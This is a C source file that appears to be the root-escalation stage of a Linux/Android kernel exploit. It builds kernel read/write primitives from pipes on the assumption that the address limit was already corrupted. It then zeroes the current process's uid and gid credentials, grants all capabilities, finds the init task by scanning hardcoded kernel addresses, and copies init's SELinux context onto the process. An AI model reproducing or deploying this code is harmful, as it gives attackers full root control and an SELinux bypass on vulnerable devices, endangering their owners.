#include <stdio.h>
#include <stdbool.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>

#define KERNEL_START            0xffffffc000000000

struct thread_info;
struct task_struct;
struct cred;
struct kernel_cap_struct;
struct task_security_struct;
struct list_head;

struct thread_info {
	unsigned long		flags;		/* low level flags */
	unsigned long       addr_limit;	/* address limit */
	struct task_struct	*task;		/* main task structure */
    /* ... */
};

struct kernel_cap_struct {
  unsigned cap[2];
};

struct cred {
  unsigned usage;
  uid_t uid;
  gid_t gid;
  uid_t suid;
  gid_t sgid;
  uid_t euid;
  gid_t egid;
  uid_t fsuid;
  gid_t fsgid;
  unsigned securebits;
  struct kernel_cap_struct cap_inheritable;
  struct kernel_cap_struct cap_permitted;
  struct kernel_cap_struct cap_effective;
  struct kernel_cap_struct cap_bset;
  struct task_security_struct *security;

  /* ... */
};

struct list_head {
  struct list_head *next;
  struct list_head *prev;
};

struct task_security_struct {
  unsigned osid;
  unsigned sid;
  unsigned exec_sid;
  unsigned create_sid;
  unsigned keycreate_sid;
  unsigned sockcreate_sid;
};


struct task_struct {
  long state;
  void *stack;
  int usage;
  unsigned int flags;
  char padding[0x348];
  struct list_head cpu_timers[3];
  struct cred *real_cred;  // offset 0x390
  struct cred *cred;       // offset 0x398
  char comm[16];
  /* ... */
};

static bool
is_cpu_timer_valid(struct list_head *cpu_timer)
{
  if (cpu_timer->next != cpu_timer->prev) {
    return false;
  }

  if ((unsigned long int)cpu_timer->next < KERNEL_START) {
    return false;
  }

  return true;
}


static int 
kernel_read(void* address, void* buf, ssize_t len)
{
  int ret = 1;
  int pipes[2];

  if (pipe(pipes))
    return -1;

  if (write(pipes[1], address, len) != len) {
    perror("write():");
    printf("%p\n",address);
    ret = -2;
    goto end;
  }
  if (read(pipes[0], buf, len) != len) {
    perror("read():");
    ret = -3;
    goto end;
  }
  ret = 0;
end:
  close(pipes[1]);
  close(pipes[0]);
  return ret;
}

static int 
kernel_write(void* address, void* buf, ssize_t len)
{
  int ret = 1;
  int pipes[2];

  if (pipe(pipes))
    return -1;

  if (write(pipes[1], buf, len) != len) {
    perror("write():");
    ret = -2;
    goto end;
  }
  if (read(pipes[0], address, len) != len) {
    perror("read():");
    ret = -3;
    goto end;
  }
  ret = 0;
end:
  close(pipes[1]);
  close(pipes[0]);
  return ret;
}

int
get_root(unsigned long *sp)
{
  struct thread_info *info;
  struct task_struct *task;
  struct task_struct init_task;
  struct task_struct swapper_task;
  struct cred *cred;
  struct task_security_struct *security;
  struct task_security_struct *init_security;
  struct list_head tasks;
  struct list_head *pos;
  unsigned long *buf;
  unsigned long l;
  int i;
  int success;

  buf = malloc(0x100);
  info = (struct thread_info*)sp;

  kernel_read(&info->task, buf, 8);
  task = (struct task_struct *)*buf;

  kernel_read(&task->cred, buf, 8);
  cred = (struct cred *)*buf;

  if (cred == NULL) {
    return 1;
  }
  
  *(unsigned int *)buf = 0;
  kernel_write(&cred->uid, buf, 4);
  kernel_write(&cred->gid, buf, 4);
  kernel_write(&cred->suid, buf, 4);
  kernel_write(&cred->sgid, buf, 4);
  kernel_write(&cred->euid, buf, 4);
  kernel_write(&cred->egid, buf, 4);
  kernel_write(&cred->fsuid, buf, 4);
  kernel_write(&cred->fsgid, buf, 4);

  *(unsigned int *)buf = 0xffffffff;
  kernel_write(&cred->cap_inheritable.cap[0], buf, 4);
  kernel_write(&cred->cap_inheritable.cap[1], buf, 4);
  kernel_write(&cred->cap_permitted.cap[0], buf, 4);
  kernel_write(&cred->cap_permitted.cap[1], buf, 4);
  kernel_write(&cred->cap_effective.cap[0], buf, 4);
  kernel_write(&cred->cap_effective.cap[1], buf, 4);
  kernel_write(&cred->cap_bset.cap[0], buf, 4);
  kernel_write(&cred->cap_bset.cap[1], buf, 4);

  kernel_read(&cred->security, buf, 8);
  security = (struct task_security_struct *)*buf;
 
  for (l = 0xffffffc0005f6000; l < 0xffffffc000687bcf; l += 8) {
    kernel_read((void *)l, &swapper_task, sizeof(struct task_struct));
    if (((unsigned long)swapper_task.stack & 0x3fff) == 0 && swapper_task.usage == 0x2 && swapper_task.flags == 0x200000) {
      printf("Find task_struct of swapper process: %p\n", (void *)l);
      // printf("comm: %s\n",swapper_task.comm);
      break;
    }
  }

  // get tasks list, 0x400 should be large enough
  for (i = 0; i < 0x400; i += 4) {
    if (*(int *)((char *)&swapper_task + i) == 0x8c) {
      tasks = *(struct list_head *)((char *)&swapper_task + i - 0x10);
    }
  }
    
  // find init process
  success = 0;
  pos = tasks.next;
  do {
    // printf("pos : %p\n", pos);
    for (i = 0x400; i > 0; i -= 4) {
      kernel_read((void *)((char *)pos - i), &init_task, sizeof(struct task_struct));
      if(is_cpu_timer_valid(&init_task.cpu_timers[0])
        && is_cpu_timer_valid(&init_task.cpu_timers[1])
        && is_cpu_timer_valid(&init_task.cpu_timers[2])
        && init_task.real_cred == init_task.cred) {
          // printf("current comm : %s\n",init_task.comm);
          if(!strcmp(init_task.comm,"init")){
            printf("Find task_struct of init process: %p\n",(void *)((char *)pos - i));
            success = 1;
            break;
          }
      }
    }
    if (success)
      break;
    kernel_read(&pos->next, &pos, 8);
  } while (pos != tasks.next);

  if (success != 1) {
    printf("failed to find init\n");
    return -1;
  }
  
  kernel_read(&init_task.cred->security, buf, 8);
  init_security= (struct task_security_struct *)*buf;
  kernel_read(init_security, buf, 0x18);
  // printf("*init_security: %#lx %#lx %#lx\n",buf[0],buf[1],buf[2]);
  kernel_write(security, buf, 0x18);

  return 0;
}
